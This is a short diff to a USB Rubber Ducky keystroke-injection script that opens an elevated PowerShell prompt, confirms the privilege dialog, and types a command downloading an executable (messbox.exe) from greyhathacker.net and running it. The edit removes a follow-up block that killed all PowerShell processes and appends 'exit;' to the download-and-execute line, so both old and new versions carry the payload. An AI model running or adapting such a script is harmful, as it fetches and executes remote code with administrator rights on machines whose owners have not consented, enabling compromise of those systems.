@@ -22,18 +22,5 @@ ENTER
 DELAY 1000
 ALT y
 DELAY 500
-STRING $down = New-Object System.Net.WebClient; $url = 'http://www.greyhathacker.net/tools/messbox.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
-ENTER
-REM change delay based on how big of a file and how fast network is
-DELAY 2000
-GUI r
-DELAY 200
-REM my best attempt at now closing all powershell instances
-STRING powershell Start-Process powershell -Verb runAs
-ENTER
-DELAY 1200
-ALT y
-DELAY 500
-STRING taskkill /F /IM powershell.exe 
-ENTER
+STRING $down = New-Object System.Net.WebClient; $url = 'http://www.greyhathacker.net/tools/messbox.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
 ```
